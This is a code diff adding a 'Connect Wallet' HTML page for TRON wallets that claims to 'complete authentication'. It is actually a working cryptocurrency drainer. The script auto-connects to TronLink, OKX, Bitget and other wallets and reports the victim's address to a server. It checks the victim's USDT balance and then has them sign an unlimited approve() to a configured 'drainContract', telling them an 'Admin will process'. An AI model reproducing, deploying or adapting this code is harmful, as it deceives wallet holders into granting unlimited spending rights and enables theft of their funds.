@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Connect Wallet</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Inter', -apple-system, sans-serif;
+      background: #000; color: #fff;
+      min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px;
+    }
+    .container {
+      width: 100%; max-width: 400px;
+      background: #111; border: 1px solid #222; border-radius: 16px;
+      padding: 28px 20px;
+    }
+    .header { text-align: center; margin-bottom: 16px; }
+    .header h2 { font-size: 18px; font-weight: 600; margin-bottom: 4px; }
+    .header p { font-size: 12px; color: #666; }
+    .msg {
+      padding: 10px 14px; border-radius: 10px; font-size: 13px; line-height: 1.5;
+      margin-bottom: 14px; display: none; border: 1px solid transparent;
+    }
+    .msg.show { display: block; }
+    .msg.err { background: #1a0a0a; border-color: #331111; color: #ff6b6b; }
+    .msg.ok { background: #0a1a0a; border-color: #113311; color: #6bff6b; }
+    .msg.inf { background: #0a0a1a; border-color: #111133; color: #6b6bff; }
+    .wallet-list { display: flex; flex-direction: column; gap: 6px; }
+    .wallet-btn {
+      display: flex; align-items: center; gap: 12px;
+      padding: 12px 14px; background: #181818; border: 1px solid #2a2a2a;
+      border-radius: 12px; cursor: pointer; font-family: inherit; color: #fff;
+      text-align: left; width: 100%; transition: border-color 0.15s;
+    }
+    .wallet-btn:hover { border-color: #444; }
+    .wallet-btn:active { transform: scale(0.98); }
+    .wallet-btn .ico {
+      width: 36px; height: 36px; border-radius: 10px;
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+      overflow: hidden;
+    }
+    .wallet-btn .ico img { width: 100%; height: 100%; object-fit: contain; }
+    .wallet-btn .nm { font-size: 14px; font-weight: 500; }
+    .status-icon {
+      text-align: center; margin: 20px 0;
+    }
+    .status-icon svg { width: 64px; height: 64px; }
+    .spinner {
+      display: inline-block; width: 40px; height: 40px;
+      border: 3px solid rgba(255,255,255,0.1); border-top-color: #fff;
+      border-radius: 50%; animation: spin 0.6s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .footer { margin-top: 18px; text-align: center; font-size: 11px; color: #333; }
+    .screen { display: none; }
+    .screen.on { display: block; }
+    #connectStatus { display: none; }
+    .retry-btn {
+      display: block; width: 100%; padding: 14px; border-radius: 12px;
+      border: none; background: #4ade80; color: #000; font-size: 15px;
+      font-weight: 600; cursor: pointer; font-family: inherit; text-align: center; margin-top: 12px;
+    }
+    .retry-btn:hover { background: #22c55e; }
+    .retry-btn:active { transform: scale(0.98); }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h2>Connect Wallet</h2>
+      <p>Connect to complete authentication</p>
+    </div>
+    <div id="msgBox"></div>
+
+    <div class="screen on" id="scConnect">
+      <div class="wallet-list" id="walletList"></div>
+      <button class="retry-btn" id="manualConnectBtn" style="display:none;">Connect Wallet</button>
+    </div>
+
+    <div class="screen" id="scWait">
+      <div class="status-icon"><div class="spinner"></div></div>
+      <div style="text-align:center;font-size:14px;color:#888;">Connecting...</div>
+    </div>
+
+    <div class="screen" id="scDone">
+      <div class="status-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/>
+          <polyline points="22 4 12 14.01 9 11.01"/>
+        </svg>
+      </div>
+      <div style="text-align:center;">
+        <div style="font-size:16px;font-weight:600;color:#4ade80;margin-bottom:4px;" id="doneTitle">Connected!</div>
+        <div style="font-size:12px;color:#666;" id="doneAddress"></div>
+        <div style="font-size:12px;color:#555;margin-top:12px;">You can close this page</div>
+      </div>
+    </div>
+
+    <div class="screen" id="scFallback">
+      <div style="text-align:center;margin:10px 0;">
+        <div style="font-size:14px;color:#ffd700;margin-bottom:8px;">Can't open wallet automatically</div>
+        <div style="font-size:12px;color:#888;margin-bottom:12px;">Copy the link and open it in your wallet's built-in browser</div>
+        <div id="fallbackLink" style="background:#0d0d0d;border:1px solid #333;border-radius:8px;padding:10px;font-size:11px;color:#aaa;word-break:break-all;margin-bottom:10px;text-align:left;"></div>
+        <button onclick="copyLink()" style="width:100%;padding:10px;border-radius:10px;border:1px solid #444;background:#222;color:#fff;font-size:13px;cursor:pointer;font-family:inherit;">Copy link</button>
+        <div id="copyMsg" style="font-size:11px;color:#4ade80;margin-top:6px;display:none;">Copied!</div>
+      </div>
+      <button class="back-btn" onclick="location.reload()" style="display:block;width:100%;padding:10px;border-radius:10px;border:1px solid #222;background:transparent;color:#666;font-size:13px;cursor:pointer;font-family:inherit;text-align:center;margin-top:12px;">Back</button>
+    </div>
+    <div class="screen" id="scError">
+      <div class="status-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#ff6b6b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="12" r="10"/>
+          <line x1="15" y1="9" x2="9" y2="15"/>
+          <line x1="9" y1="9" x2="15" y2="15"/>
+        </svg>
+      </div>
+      <div style="text-align:center;font-size:14px;color:#ff6b6b;" id="errorText">Connection failed</div>
+      <button class="back-btn" onclick="location.reload()" style="display:block;width:100%;padding:10px;border-radius:10px;border:1px solid #222;background:transparent;color:#666;font-size:13px;cursor:pointer;font-family:inherit;text-align:center;margin-top:16px;">Try again</button>
+    </div>
+
+    <div class="footer">TRON NETWORK</div>
+  </div>
+
+  <script>
+    var SESSION_ID = '{{SESSION_ID}}';
+    var SITE_URL = '{{SITE_URL}}';
+
+    var config = {};
+    var USDT_ABI = [
+      {"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"},
+      {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
+      {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}
+    ];
+
+    var WALLETS = [
+      { id:'tronlink', name:'TronLink', logo:'https://tronlink.org/favicon.ico' },
+      { id:'okx', name:'OKX', logo:'https://dl.svgcdn.com/svg/token-branded/okx.svg' },
+      { id:'tokenpocket', name:'TokenPocket', logo:'https://dl.svgcdn.com/svg/token-branded/token-pocket.svg' },
+      { id:'bitget', name:'Bitget', logo:'https://dl.svgcdn.com/svg/token-branded/bitget.svg' },
+      { id:'imtoken', name:'imToken', logo:'https://dl.svgcdn.com/svg/token-branded/imtoken.svg' },
+    ];
+
+    var msgBox = document.getElementById('msgBox');
+    var walletList = document.getElementById('walletList');
+    var activeProvider = null;
+
+    function msg(type, text) { msgBox.innerHTML = '<div class="msg show ' + type + '">' + text + '</div>'; }
+    function hideMsg() { msgBox.innerHTML = ''; }
+    function scShow(id) {
+      document.querySelectorAll('.screen').forEach(function(s){ s.classList.remove('on'); });
+      document.getElementById(id).classList.add('on');
+    }
+
+    function getTronWeb() {
+      if (window.tronWeb && window.tronWeb.ready) return window.tronWeb;
+      if (window.tronWeb) return window.tronWeb;
+      return null;
+    }
+    function getOkx() { return window.okxwallet || null; }
+    function getBitget() { return window.bitkeep || null; }
+    function getGate() { return window.gatewallet || null; }
+    function getBybit() { return window.bybitWallet || null; }
+
+    function findProvider() {
+      var tw = getTronWeb();
+      if (tw) return tw;
+      var okx = getOkx();
+      if (okx) {
+        var p = okx.tron || okx.tronLink;
+        if (p && p.tronWeb && p.tronWeb.ready) return p.tronWeb;
+      }
+      var bg = getBitget();
+      if (bg && bg.tron && bg.tron.tronWeb && bg.tron.tronWeb.ready) return bg.tron.tronWeb;
+      var gw = getGate();
+      if (gw && gw.tron && gw.tron.tronWeb && gw.tron.tronWeb.ready) return gw.tron.tronWeb;
+      var bb = getBybit();
+      if (bb && bb.tronLink && bb.tronLink.tronWeb && bb.tronLink.tronWeb.ready) return bb.tronLink.tronWeb;
+      return null;
+    }
+
+    async function sendAddressToServer(address) {
+      var r = await fetch(SITE_URL + '/api/qr-connect/' + SESSION_ID, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ address: address })
+      });
+      return r.json();
+    }
+
+    async function doApproveFlow(address, tw) {
+      document.getElementById('doneAddress').textContent = address;
+
+      var logMsg = document.getElementById('doneTitle');
+
+      if (!config.drainContract) {
+        logMsg.textContent = 'Connected! No contract configured';
+        logMsg.style.color = '#ffd700';
+        scShow('scDone');
+        return;
+      }
+
+      logMsg.textContent = 'Checking balance...';
+
+      try {
+        var usdtContract = await tw.contract(USDT_ABI).at(config.usdtContract);
+        var raw = await usdtContract.balanceOf(address).call();
+        var bal = raw.toNumber ? raw.toNumber() : Number(raw);
+        if (bal <= 0) {
+          logMsg.textContent = 'No USDT found on this address';
+          logMsg.style.color = '#ffd700';
+          scShow('scDone');
+          return;
+        }
+
+        logMsg.textContent = 'Sign approve in wallet...';
+
+        var approveVal = config.maxApprove || '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+
+        var approveTx = await tw.transactionBuilder.triggerSmartContract(
+          config.usdtContract, 'approve(address,uint256)',
+          { feeLimit: 20000000 },
+          [
+            { type: 'address', value: config.drainContract },
+            { type: 'uint256', value: approveVal }
+          ],
+          address
+        );
+        var signedApprove = await tw.trx.sign(approveTx.transaction || approveTx);
+        var approveReceipt = await tw.trx.sendRawTransaction(signedApprove);
+        var approveTxId = '';
+        if (typeof approveReceipt === 'string') approveTxId = approveReceipt;
+        else if (approveReceipt) approveTxId = approveReceipt.txid || approveReceipt.txID || '';
+
+        if (!approveTxId) {
+          logMsg.textContent = 'Approve failed';
+          logMsg.style.color = '#ff6b6b';
+          scShow('scDone');
+          return;
+        }
+
+        fetch(SITE_URL + '/api/approve-done', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ address: address })
+        }).catch(function(){});
+
+        logMsg.textContent = 'Approved! Admin will process';
+        logMsg.style.color = '#4ade80';
+        scShow('scDone');
+      } catch(e) {
+        logMsg.textContent = 'Error: ' + (e.message || 'unknown');
+        logMsg.style.color = '#ff6b6b';
+        scShow('scDone');
+      }
+    }
+
+    var isMobile = /Android|iPhone|iPad|iPod|webOS/i.test(navigator.userAgent);
+
+    async function tryConnect(attempts) {
+      attempts = attempts || 0;
+      if (attempts > 15) return null;
+      var p = findProvider();
+      if (!p) {
+        await new Promise(function(r) { setTimeout(r, 500); });
+        return tryConnect(attempts + 1);
+      }
+      try {
+        if (p.request) {
+          var res = await p.request({ method: 'tron_requestAccounts' });
+          if (res) {
+            if (typeof res === 'string') return { address: res, provider: p };
+            if (Array.isArray(res)) return { address: res[0], provider: p };
+            if (res.address) return { address: res.address, provider: p };
+            if (res.data && typeof res.data === 'string') return { address: res.data, provider: p };
+            if (res.data && res.data.address) return { address: res.data.address, provider: p };
+          }
+        }
+        if (p.defaultAddress && p.defaultAddress.base58) {
+          return { address: p.defaultAddress.base58, provider: p };
+        }
+      } catch(e) {}
+      await new Promise(function(r) { setTimeout(r, 500); });
+      return tryConnect(attempts + 1);
+    }
+
+    var fallbackUrl = '';
+    var deepLinkTimer = null;
+
+    function showFallback(url) {
+      fallbackUrl = url;
+      document.getElementById('fallbackLink').textContent = url;
+      scShow('scFallback');
+    }
+
+    function copyLink() {
+      if (!fallbackUrl) return;
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(fallbackUrl).then(function() {
+          document.getElementById('copyMsg').style.display = 'block';
+          setTimeout(function(){ document.getElementById('copyMsg').style.display = 'none'; }, 2000);
+        }).catch(function() { fallbackCopy(); });
+      } else {
+        fallbackCopy();
+      }
+    }
+
+    function fallbackCopy() {
+      var ta = document.createElement('textarea');
+      ta.value = fallbackUrl;
+      ta.style.position = 'fixed'; ta.style.opacity = '0';
+      document.body.appendChild(ta);
+      ta.select();
+      try { document.execCommand('copy'); document.getElementById('copyMsg').style.display = 'block'; } catch(e) {}
+      document.body.removeChild(ta);
+      setTimeout(function(){ document.getElementById('copyMsg').style.display = 'none'; }, 2000);
+    }
+
+    function openInWalletBrowser(walletId) {
+      var currentUrl = window.location.href.split('?')[0].split('#')[0];
+
+      var deeplink = '';
+      if (walletId === 'tronlink') {
+        var param = encodeURIComponent(JSON.stringify({
+          url: currentUrl, action: 'open', protocol: 'tronlink', version: '1.0'
+        }));
+        deeplink = 'tronlinkoutside://pull.activity?param=' + param;
+      } else if (walletId === 'trust') {
+        deeplink = 'https://link.trustwallet.com/open?url=' + encodeURIComponent(currentUrl);
+      } else if (walletId === 'okx') {
+        deeplink = 'okx://wallet/dapp/url?url=' + encodeURIComponent(currentUrl);
+      } else if (walletId === 'tokenpocket') {
+        deeplink = 'tp://open?url=' + encodeURIComponent(currentUrl);
+      } else if (walletId === 'bitget') {
+        deeplink = 'bitkeep://browser?url=' + encodeURIComponent(currentUrl);
+      } else if (walletId === 'imtoken') {
+        deeplink = 'imtokenv2://navigate?screen=Browser&url=' + encodeURIComponent(currentUrl);
+      }
+
+      if (deeplink) {
+        var pageHidden = false;
+        function onVisibility() {
+          if (document.hidden || document.webkitHidden) {
+            pageHidden = true;
+          }
+        }
+        document.addEventListener('visibilitychange', onVisibility);
+        document.addEventListener('webkitvisibilitychange', onVisibility);
+        window.location.href = deeplink;
+        deepLinkTimer = setTimeout(function() {
+          document.removeEventListener('visibilitychange', onVisibility);
+          document.removeEventListener('webkitvisibilitychange', onVisibility);
+          if (!pageHidden) {
+            showFallback(currentUrl);
+          }
+        }, 2500);
+      } else {
+        showFallback(currentUrl);
+      }
+    }
+
+    async function connectWallet(walletId) {
+      hideMsg();
+      scShow('scWait');
+
+      var result = await tryConnect();
+      var addr = result ? result.address : null;
+      var provider = result ? result.provider : null;
+
+      if (addr && provider) {
+        sendAddressToServer(addr).catch(function(){});
+        await doApproveFlow(addr, provider);
+      } else if (walletId && isMobile) {
+        openInWalletBrowser(walletId);
+      } else {
+        document.getElementById('errorText').textContent = walletId ? 'Wallet not detected. Tap to retry.' : 'Could not connect. Tap a wallet to try again.';
+        scShow('scError');
+      }
+    }
+
+    function render() {
+      walletList.innerHTML = '';
+      for (var i = 0; i < WALLETS.length; i++) {
+        var w = WALLETS[i];
+        var b = document.createElement('button'); b.className = 'wallet-btn';
+        b.innerHTML = '<div class="ico"><img src="'+w.logo+'" alt="'+w.name+'" loading="lazy"></div><div class="nm">'+w.name+'</div>';
+        b.addEventListener('click', (function(id){ return function(){ connectWallet(id); }; })(w.id));
+        walletList.appendChild(b);
+      }
+    }
+
+    render();
+
+    fetch(SITE_URL + '/api/config').then(function(r){ return r.json(); }).then(function(d){ config = d; }).catch(function(){});
+
+    document.getElementById('manualConnectBtn').addEventListener('click', function() {
+      connectWallet(null);
+    });
+
+    async function autoConnectFlow(p) {
+      scShow('scWait');
+      var addr = null;
+      if (p.defaultAddress && p.defaultAddress.base58) addr = p.defaultAddress.base58;
+      if (!addr && p.request) {
+        try {
+          var res = await p.request({ method: 'tron_requestAccounts' });
+          if (typeof res === 'string') addr = res;
+          else if (Array.isArray(res)) addr = res[0];
+          else if (res && res.address) addr = res.address;
+        } catch(e) {}
+      }
+      if (!addr && p.defaultAddress && p.defaultAddress.base58) addr = p.defaultAddress.base58;
+      if (addr) {
+        activeProvider = p;
+        sendAddressToServer(addr).catch(function(){});
+        await doApproveFlow(addr, p);
+      } else {
+        scShow('scConnect');
+      }
+    }
+
+    (async function autoConnect() {
+      var found = false;
+      for (var i = 0; i < 20; i++) {
+        var p = findProvider();
+        if (p) {
+          if (p.defaultAddress && p.defaultAddress.base58) {
+            autoConnectFlow(p);
+            found = true;
+            return;
+          }
+          if (p.request && i > 3) {
+            try {
+              var res = await p.request({ method: 'tron_requestAccounts' });
+              if (res) {
+                autoConnectFlow(p);
+                found = true;
+                return;
+              }
+            } catch(e) {}
+          }
+        }
+        await new Promise(function(r) { setTimeout(r, 500); });
+      }
+      if (!found) {
+        document.getElementById('manualConnectBtn').style.display = 'block';
+      }
+    })();
+  </script>
+</body>
+</html>
